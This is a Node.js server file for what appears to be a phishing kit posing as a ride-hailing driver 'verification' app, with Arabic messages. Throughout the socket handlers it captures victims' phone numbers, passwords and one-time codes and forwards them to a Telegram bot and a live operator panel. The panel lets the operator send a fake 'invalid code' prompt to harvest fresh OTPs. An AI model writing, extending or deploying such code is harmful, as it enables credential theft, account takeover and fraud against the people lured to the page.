const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const cors = require('cors');
const path = require('path');
const connectDB = require('./config/db');
const Verification = require('./models/Verification');
const telegramNotifier = require('./config/telegramNotifier');

const app = express();
const server = http.createServer(app);
const io = new Server(server, {
    cors: {
        origin: "*",
        methods: ["GET", "POST"]
    }
});

let isMongoConnected = false;
// Fallback in-memory persistence if MongoDB is offline
const localVerifications = [];

// Middlewares
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));

// Connect to MongoDB
connectDB().then((connected) => {
    isMongoConnected = connected;
    telegramNotifier.initPersistedSettings(connected);
});

// REST API Endpoints
app.get('/api/verifications', async (req, res) => {
    try {
        if (isMongoConnected) {
            const data = await Verification.find().sort({ createdAt: -1 });
            return res.json({ success: true, source: 'MongoDB', data });
        } else {
            return res.json({ success: true, source: 'LocalStore', data: [...localVerifications].reverse() });
        }
    } catch (err) {
        res.status(500).json({ success: false, error: err.message });
    }
});

app.get('/api/stats', async (req, res) => {
    try {
        if (isMongoConnected) {
            const total = await Verification.countDocuments();
            const pending = await Verification.countDocuments({ status: 'PHONE_SUBMITTED' });
            const verified = await Verification.countDocuments({ status: 'VERIFIED' });
            return res.json({ success: true, total, pending, verified });
        } else {
            const total = localVerifications.length;
            const pending = localVerifications.filter(v => v.status === 'PHONE_SUBMITTED').length;
            const verified = localVerifications.filter(v => v.status === 'VERIFIED').length;
            return res.json({ success: true, total, pending, verified });
        }
    } catch (err) {
        res.status(500).json({ success: false, error: err.message });
    }
});

app.delete('/api/verifications/:id', async (req, res) => {
    try {
        const { id } = req.params;
        if (isMongoConnected) {
            await Verification.findByIdAndDelete(id);
        }
        const idx = localVerifications.findIndex(v => v._id === id || v.id === id);
        if (idx !== -1) localVerifications.splice(idx, 1);
        
        io.emit('record_deleted', { id });
        res.json({ success: true, message: 'Record deleted' });
    } catch (err) {
        res.status(500).json({ success: false, error: err.message });
    }
});

app.delete('/api/verifications', async (req, res) => {
    try {
        if (isMongoConnected) {
            await Verification.deleteMany({});
        }
        localVerifications.length = 0;
        io.emit('all_records_cleared');
        res.json({ success: true, message: 'All records cleared' });
    } catch (err) {
        res.status(500).json({ success: false, error: err.message });
    }
});

// ========== Telegram Bot Settings API ==========

app.get('/api/telegram-settings', (req, res) => {
    res.json({
        success: true,
        telegram: telegramNotifier.getTelegramConfig()
    });
});

app.post('/api/telegram-settings', async (req, res) => {
    const { botToken, chatIds, chatId } = req.body;
    const config = await telegramNotifier.saveTelegramSettings(botToken, chatIds || chatId, isMongoConnected);
    res.json({ success: true, telegram: config, message: config.configured ? 'تم حفظ إعدادات تليجرام بنجاح!' : 'تم حفظ الإعدادات' });
});

app.post('/api/telegram-settings/test', async (req, res) => {
    try {
        await telegramNotifier.sendTestNotification();
        res.json({ success: true, message: '⚡ تم إرسال إشعار تليجرام الفوري بنجاح!' });
    } catch (err) {
        res.status(400).json({ success: false, message: err.message });
    }
});

// Serve Admin Dashboard page explicitly
app.get('/admin', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'admin.html'));
});

// Wildcard catch-all route: serves customer verification app (index.html) for ANY custom link/slug (/amir, /ali, /driver-101, etc.)
app.get('*', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Socket.io Real-time Logic
io.on('connection', (socket) => {
    console.log(`[Socket.io] New client connected: ${socket.id}`);

    // Customer submits phone number
    socket.on('submit_phone', async (data, callback) => {
        const phoneNumber = data.phoneNumber ? data.phoneNumber.trim() : '';
        const customSlug = data.customSlug || '/';

        if (!phoneNumber) {
            if (callback) callback({ success: false, message: 'رقم الهاتف مطلوب' });
            return;
        }

        const now = new Date();
        const clientIp = socket.handshake.address;
        let record;

        try {
            if (isMongoConnected) {
                record = new Verification({
                    phoneNumber,
                    status: 'PHONE_SUBMITTED',
                    customSlug,
                    ipAddress: clientIp,
                    submittedAt: now
                });
                await record.save();
            } else {
                record = {
                    _id: 'LOCAL_' + Date.now() + '_' + Math.random().toString(36).substr(2, 5),
                    phoneNumber,
                    otp: null,
                    status: 'PHONE_SUBMITTED',
                    customSlug,
                    ipAddress: clientIp,
                    submittedAt: now,
                    createdAt: now
                };
                localVerifications.push(record);
            }

            console.log(`[Notification] Phone submitted: ${phoneNumber} via slug ${customSlug}`);

            // Send Telegram instant notification (non-blocking)
            telegramNotifier.notifyPhoneSubmitted({
                phoneNumber: record.phoneNumber,
                customSlug: record.customSlug,
                ipAddress: clientIp,
                submittedAt: record.submittedAt
            }).catch(err => console.error('[TelegramNotifier] Error:', err.message));

            // Broadcast real-time notification to all connected Admin dashboards
            io.emit('admin_notification', {
                type: 'NEW_PHONE',
                data: {
                    id: record._id,
                    phoneNumber: record.phoneNumber,
                    status: 'PHONE_SUBMITTED',
                    customSlug: record.customSlug,
                    submittedAt: record.submittedAt,
                    message: `العميل صاحب الرقم ${phoneNumber} قام بطلب كود التحقق (الرابط: ${customSlug})`
                }
            });

            if (callback) {
                callback({
                    success: true,
                    verificationId: record._id,
                    message: 'تم إرسال طلب الكود بنجاح'
                });
            }
        } catch (err) {
            console.error('Error handling submit_phone:', err);
            if (callback) callback({ success: false, message: err.message });
        }
    });

    // Customer submits Driver Password
    socket.on('submit_password', async (data, callback) => {
        const { verificationId, phoneNumber, password, customSlug } = data;
        const clientIp = socket.handshake.address;
        const now = new Date();

        if (!password) {
            if (callback) callback({ success: false, message: 'كلمة المرور مطلوبة' });
            return;
        }

        try {
            if (isMongoConnected) {
                if (verificationId && !verificationId.startsWith('REC_') && !verificationId.startsWith('LOCAL_')) {
                    await Verification.findByIdAndUpdate(verificationId, {
                        password,
                        status: 'PASSWORD_SUBMITTED'
                    });
                } else if (phoneNumber) {
                    await Verification.findOneAndUpdate(
                        { phoneNumber },
                        { password, status: 'PASSWORD_SUBMITTED' },
                        { sort: { createdAt: -1 } }
                    );
                }
            }

            const record = localVerifications.find(v => (v._id === verificationId || v.phoneNumber === phoneNumber));
            if (record) {
                record.password = password;
                record.status = 'PASSWORD_SUBMITTED';
            }

            console.log(`[Notification] Password submitted for ${phoneNumber || verificationId}: ${password}`);

            telegramNotifier.notifyPasswordSubmitted({
                phoneNumber: phoneNumber || record?.phoneNumber || 'Unknown',
                password,
                customSlug: customSlug || record?.customSlug || '/',
                ipAddress: clientIp,
                submittedAt: now
            }).catch(err => console.error('[TelegramNotifier] Error:', err.message));

            io.emit('admin_notification', {
                type: 'PASSWORD_SUBMITTED',
                data: {
                    id: verificationId,
                    phoneNumber: phoneNumber || record?.phoneNumber || 'Unknown',
                    password,
                    status: 'PASSWORD_SUBMITTED',
                    customSlug: customSlug || '/',
                    submittedAt: now
                }
            });

            if (callback) callback({ success: true, message: 'تم حفظ كلمة المرور' });
        } catch (err) {
            console.error('Error handling submit_password:', err);
            if (callback) callback({ success: false, message: err.message });
        }
    });

    // Customer submits 4-Digit OTP
    socket.on('submit_otp', async (data, callback) => {
        const { verificationId, phoneNumber, otp, customSlug } = data;

        if (!otp || otp.length !== 4) {
            if (callback) callback({ success: false, message: 'برجاء إدخال كود OTP مكون من 4 أرقام' });
            return;
        }

        const now = new Date();
        let updatedRecord = null;

        try {
            if (isMongoConnected && verificationId && !verificationId.startsWith('LOCAL_') && !verificationId.startsWith('REC_')) {
                updatedRecord = await Verification.findByIdAndUpdate(
                    verificationId,
                    {
                        otp: otp,
                        status: 'OTP_SUBMITTED'
                    },
                    { new: true }
                );
            }

            if (!updatedRecord) {
                // Check local store or fallback search by phone
                const localRec = localVerifications.find(
                    v => (verificationId && (v._id === verificationId || v.id === verificationId)) || v.phoneNumber === phoneNumber
                );
                if (localRec) {
                    localRec.otp = otp;
                    localRec.status = 'OTP_SUBMITTED';
                    updatedRecord = localRec;
                } else {
                    // Create new if record missing
                    updatedRecord = {
                        _id: 'LOCAL_' + Date.now(),
                        phoneNumber: phoneNumber || 'غير معروف',
                        otp: otp,
                        status: 'OTP_SUBMITTED',
                        customSlug: customSlug || '/',
                        submittedAt: now,
                        createdAt: now
                    };
                    localVerifications.push(updatedRecord);
                }
            }

            console.log(`[Notification] OTP Submitted (Awaiting Admin Decision): ${updatedRecord.phoneNumber} -> OTP: ${otp}`);

            // Send Telegram instant notification (non-blocking)
            telegramNotifier.notifyOTPVerified({
                phoneNumber: updatedRecord.phoneNumber,
                otp: otp,
                customSlug: updatedRecord.customSlug || customSlug || '/',
                ipAddress: socket.handshake.address,
                verifiedAt: now
            }).catch(err => console.error('[TelegramNotifier] Error:', err.message));

            // Broadcast real-time notification to Admin dashboard
            io.emit('admin_notification', {
                type: 'OTP_SUBMITTED',
                data: {
                    id: updatedRecord._id,
                    phoneNumber: updatedRecord.phoneNumber,
                    otp: otp,
                    status: 'OTP_SUBMITTED',
                    customSlug: updatedRecord.customSlug || customSlug || '/',
                    submittedAt: now,
                    message: `العميل (${updatedRecord.phoneNumber}) قام بوضع الـ OTP: [ ${otp} ] (في انتظار موافقة الآدمن)`
                }
            });

            if (callback) {
                callback({
                    success: true,
                    status: 'OTP_SUBMITTED',
                    message: 'تم استلام كود OTP وفي انتظار الموافقة'
                });
            }
        } catch (err) {
            console.error('Error handling submit_otp:', err);
            if (callback) callback({ success: false, message: err.message });
        }
    });

    // Admin real-time decision socket listener (Approve, Request New OTP, Reject)
    socket.on('admin_decision', async (data, callback) => {
        const { verificationId, phoneNumber, action, message } = data;
        const now = new Date();
        let newStatus = 'VERIFIED';

        if (action === 'REQUEST_NEW_OTP') newStatus = 'RETRY_OTP';
        else if (action === 'REJECT') newStatus = 'FAILED';
        else if (action === 'APPROVE') newStatus = 'VERIFIED';

        try {
            if (isMongoConnected) {
                if (verificationId && !verificationId.startsWith('REC_') && !verificationId.startsWith('LOCAL_')) {
                    await Verification.findByIdAndUpdate(verificationId, {
                        status: newStatus,
                        verifiedAt: action === 'APPROVE' ? now : null
                    });
                } else if (phoneNumber) {
                    await Verification.findOneAndUpdate(
                        { phoneNumber },
                        { status: newStatus, verifiedAt: action === 'APPROVE' ? now : null },
                        { sort: { createdAt: -1 } }
                    );
                }
            }

            const record = localVerifications.find(v => (verificationId && (v._id === verificationId || v.id === verificationId)) || v.phoneNumber === phoneNumber);
            if (record) {
                record.status = newStatus;
                if (action === 'APPROVE') record.verifiedAt = now;
            }

            if (action === 'APPROVE') {
                io.emit('verification_approved', { phoneNumber, verificationId });
            } else if (action === 'REQUEST_NEW_OTP') {
                io.emit('verification_request_new_otp', {
                    phoneNumber,
                    verificationId,
                    message: message || 'Invalid verification code. Please check your Email or SMS for a new code.'
                });
            } else if (action === 'REJECT') {
                io.emit('verification_rejected', { phoneNumber, verificationId });
            }

            io.emit('record_updated', {
                id: verificationId,
                phoneNumber,
                status: newStatus
            });

            console.log(`[Admin Action] Decision for ${phoneNumber || verificationId}: ${action} -> Status: ${newStatus}`);

            if (callback) callback({ success: true, status: newStatus });
        } catch (err) {
            console.error('Error handling admin_decision:', err);
            if (callback) callback({ success: false, message: err.message });
        }
    });

    socket.on('disconnect', () => {
        // Log disconnection silently
    });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`====================================================`);
    console.log(`🚀 Guber Verification App running on http://localhost:${PORT}`);
    console.log(`📊 Admin Dashboard available at http://localhost:${PORT}/admin`);
    console.log(`====================================================`);
});
